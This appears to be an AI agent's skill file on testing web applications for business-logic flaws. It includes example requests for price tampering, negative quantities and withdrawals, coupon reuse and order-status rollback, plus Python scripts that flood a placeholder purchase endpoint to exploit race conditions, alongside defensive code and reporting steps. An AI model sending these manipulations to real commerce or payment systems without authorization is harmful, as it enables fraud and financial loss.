---
name: business-logic-testing
description: Professional skills and methodology for business-logic vulnerability testing
version: 1.0.0
---

# Business-Logic Vulnerability Testing

## Overview

Business-logic vulnerabilities are design flaws in an application's business workflows that can lead to unauthorized operations, data tampering, or financial loss. This skill provides detection, exploitation, and defense methods.

## Vulnerability types

### 1. Workflow bypass

**Skipping validation steps:**
- Jump straight to the final step
- Reorder steps
- Re-execute steps

### 2. Price manipulation

**Negative prices:**
- Submit a negative amount
- May increase the account balance

**Price tampering:**
- Modify the frontend price
- Modify the price in the API request

### 3. Quantity-limit bypass

**Negative quantities:**
- Submit negative values
- May increase stock

**Exceeding limits:**
- Modify quantity caps
- Bulk-operation bypass

### 4. Race conditions

**Concurrent requests:**
- Fire multiple requests at once
- Bypass one-time limits

### 5. State manipulation

**State rollback:**
- Flip a completed order back to pending payment
- Modify order status

## Testing methodology

### 1. Workflow analysis

**Identify business flows:**
- Registration flow
- Purchase flow
- Withdrawal flow
- Review/approval flow

**Test step skipping:**
```
Normal flow: step 1 → step 2 → step 3
Test: access step 3 directly
Test: step 1 → step 3 (skip step 2)
```

### 2. Parameter tampering

**Modify key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # change to 0.01
}
```

**Negative-value tests:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency testing

**Fire simultaneous requests:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase', 
                  json={'product_id': 123, 'quantity': 1})

# Fire 10 requests at once
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State modification

**Modify order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # change to completed
}
```

**Roll back status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # roll back from completed to pending
}
```

## Exploitation techniques

### Price manipulation

**Negative price:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modify frontend price:**
```javascript
// Frontend code
const price = 100.00;

// Change to
const price = 0.01;
```

**API price modification:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # original 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity-limit bypass

**Negative quantity:**
```json
{
  "product_id": 123,
  "quantity": -10  # may increase stock
}
```

**Exceeding limits:**
```json
{
  "product_id": 123,
  "quantity": 999999  # exceeds the per-order limit
}
```

### Coupon abuse

**Reuse:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupon repeatedly
```

**Inactive coupons:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # use an expired coupon
  "items": [...]
}
```

### Withdrawal flaws

**Negative withdrawal:**
```json
{
  "amount": -1000.00  # may increase the account balance
}
```

**Exceeding balance:**
```json
{
  "amount": 999999.00  # exceeds account balance
}
```

### Race conditions

**Concurrent purchases:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Flash sale — concurrent requests
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass techniques

### Frontend-validation bypass

**Call the API directly:**
- Bypass frontend JavaScript validation
- Send API requests directly

**Modify requests:**
- Intercept with Burp Suite
- Alter parameters before sending

### Status-code analysis

**Observe responses:**
- 200 OK — likely succeeded
- 400 Bad Request — bad parameters
- 403 Forbidden — insufficient privilege
- 500 Internal Server Error — server error

### Error-message exploitation

**Harvest info from error messages:**
```
Error: "Insufficient balance, current balance: 100.00"
→ leaks the account balance
```

## Tool usage

### Burp Suite

**Repeater:**
1. Intercept a business request
2. Modify key parameters
3. Observe the response

**Intruder:**
1. Mark parameters
2. Use a payload list
3. Bulk-test

### Custom scripts

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and reporting

### Verification steps

1. Confirm you can bypass a business-logic limit
2. Verify you can perform unauthorized operations
3. Assess impact (financial loss, data tampering, etc.)
4. Record a complete PoC
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials

- Vulnerability location and business flow
- Unauthorized operations that can be performed
- Complete exploitation steps and PoC
- Remediation advice (server-side validation, business-rule checks, etc.)

## Defenses

### Recommended

1. **Server-side validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Fetch the real price from the database
       real_price = db.get_product_price(product_id)
       
       # Validate the price
       if price != real_price:
           raise ValueError("Price mismatch")
       
       # Validate the quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")
       
       # Process the purchase
       process_order(product_id, quantity, real_price)
   ```

2. **State-machine validation**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"
       
       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }
       
       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency control**
   ```python
   import threading
   
   lock = threading.Lock()
   
   def process_order(order_id):
       with lock:
           # Check order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")
           
           # Process the order
           process(order)
   ```

4. **Business-rule validation**
   ```python
   def validate_business_rules(order):
       # Validate quantity limits
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")
       
       # Validate price range
       if order.price <= 0:
           raise ValueError("Invalid price")
       
       # Validate stock
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit logging**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Notes

- Test only in authorized environments
- Avoid real impact on business operations
- Mind differences across business flows
- Preserve data consistency while testing
